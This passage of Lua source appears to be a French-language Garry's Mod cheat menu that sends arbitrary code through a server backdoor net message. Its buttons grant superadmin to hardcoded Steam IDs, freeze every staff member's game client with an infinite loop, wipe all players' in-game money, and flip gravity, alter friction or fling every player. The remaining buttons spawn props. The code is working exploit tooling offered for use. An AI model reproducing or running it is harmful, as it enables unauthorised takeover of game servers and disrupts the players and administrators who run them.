net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Les Joueurs Se Mettent A Rire." )
    SploitNotify("Les Joueurs Se Mettent A Rire.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 570 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Le Sol En Patinoire" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"1\")" )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Sa glisse bordel." )
    SploitNotify("Sa glisse bordel.")
    surface.PlaySound("buttons/blip1.wav") 
end

---------- MISC ----------- 

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 135, 30 )
        Macro:SetParent(Misc)
        Macro:SetText( "DONNER LE GRADE SUPERADMIN" )
        Macro:SetFont( "vaporfont2" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 600, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
		
local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 190, 90 )
Macro:SetText( "_S P A R K S" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_1:0:105015067\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Le Chef est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 570, 90 )
Macro:SetText( "LENNY EXPLOITS" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_1:0:81414478\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Black exploits est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end
end

-------------------------------------------------

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Undo" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("undo")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Dernier Props suprimer." )
    SploitNotify("Dernier Props suprimer.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Logo Garry's Mod" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/maxofs2d/logo_gmod_b.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Logo Garry's Mod." )
    SploitNotify("Spawn Logo Garry's Mod.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Ciel Rouge" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_combine/portalskydome.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Ciel Rouge." )
    SploitNotify("Spawn Ciel Rouge.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Immeuble 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/row_res_1_fullscale.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Immeuble 1." )
    SploitNotify("Spawn Immeuble 1.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Immeuble 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/collapsedbuilding02b.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Immeuble 2." )
    SploitNotify("Spawn Immeuble 2.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Immeuble 3" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/project_building02.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Immeuble 3." )
    SploitNotify("Spawn Immeuble 3.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Immeuble 4" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/building_002a.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Immeuble 4." )
    SploitNotify("Spawn Immeuble 4.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Micro Props" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props/cs_office/plant01_gib1.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Micro Props." )
    SploitNotify("Spawn Micro Props.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Micro Props" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props/cs_office/plant01_gib1.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Micro Props." )
    SploitNotify("Spawn Micro Props.")
    surface.PlaySound("buttons/blip1.wav") 
end
-------------------------------------------------------------------------------------|
local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Arbre 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_foliage/tree_poplar_01.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Arbre 1." )
    SploitNotify("Spawn Arbre 1.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Arbre 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_foliage/tree_cliff_02a.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Arbre 2." )
    SploitNotify("Spawn Arbre 2.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Gros Cube 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/hunter/blocks/cube8x8x8.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Gros Cube 1." )
    SploitNotify("Spawn Gros Cube 1.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Gros Cube 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/hunter/blocks/cube6x6x6.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Gros Cube 2." )
    SploitNotify("Spawn Gros Cube 2.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grande chaise" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/Cranes/crane_frame.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Grande chaise." )
    SploitNotify("Spawn Grande chaise.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grande Muraille" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_wasteland/medbridge_base01.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Grande Muraille." )
    SploitNotify("Spawn Grande Muraille.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 450 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Montagne effect" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_skybox/coast01.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Montagne effect." )
    SploitNotify("Spawn Montagne effect.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 480 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grande Immeuble 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_combine/prison01b.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Grande Immeuble 1." )
    SploitNotify("Spawn Grande Immeuble 1.")
    surface.PlaySound("buttons/blip1.wav") 
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Props)
Macro:SetPos( 20, 510 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grande Immeuble 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/project_destroyedbuildings01.mdl")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spawn Grande Immeuble 2." )
    SploitNotify("Spawn Grande Immeuble 2.")
    surface.PlaySound("buttons/blip1.wav") 
end

------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Props)
Macro:SetPos( 210, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 160, 25 )
Macro:SetText( "Devenir un cheval MultiCouleurs" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 65, 65, 255))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Votre skins est un cheval." )
    SploitNotify("Votre skins est un cheval.")
    surface.PlaySound("buttons/blip1.wav") 
end
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Props)
Macro:SetPos( 210, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 160, 25 )
Macro:SetText( "Devenir des toilettes MultiCouleurs" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(240, 101, 255, 255))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/props/cs_militia/toilet.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Votre skins est des toilettes." )
    SploitNotify("Votre skins est des toilettes.")
    surface.PlaySound("buttons/blip1.wav") 
end	
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Props)
Macro:SetPos( 210, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 160, 25 )
Macro:SetText( "Devenir un Humain MultiCouleurs" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(104, 101, 255, 255))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/player/group02/male_04.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Votre skins est des toilettes." )
    SploitNotify("Votre skins est des toilettes.")
    surface.PlaySound("buttons/blip1.wav") 
end	
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Props)
Macro:SetPos( 210, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 160, 25 )
Macro:SetText( "Devenir un Immeuble MultiCouleurs" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(108, 255, 221, 255))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/props_buildings/project_destroyedbuildings01.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Votre skins est un Immeuble MultiCouleurs." )
    SploitNotify("Votre skins est un Immeuble MultiCouleurs.")
    surface.PlaySound("buttons/blip1.wav") 
end	
end

-------------------------------------------------------------------------------------|

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Crash admins" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Les admins ont crash :)" )
    SploitNotify("Tout les admins vont crash !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Pousser tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Pousser tout le monde activé" )
    SploitNotify("Cac Brooked  !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 380, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Reset argent" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Argent reset" )
    SploitNotify("Argent reset")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Inversé la gravité" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Gravité inversé" )
    SploitNotify("Gravité inversé à -600")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Niquer la physic" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Physic niqué" )
    SploitNotify("Physic changé à -8")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Hurlement" )
Macro.Paint = function()
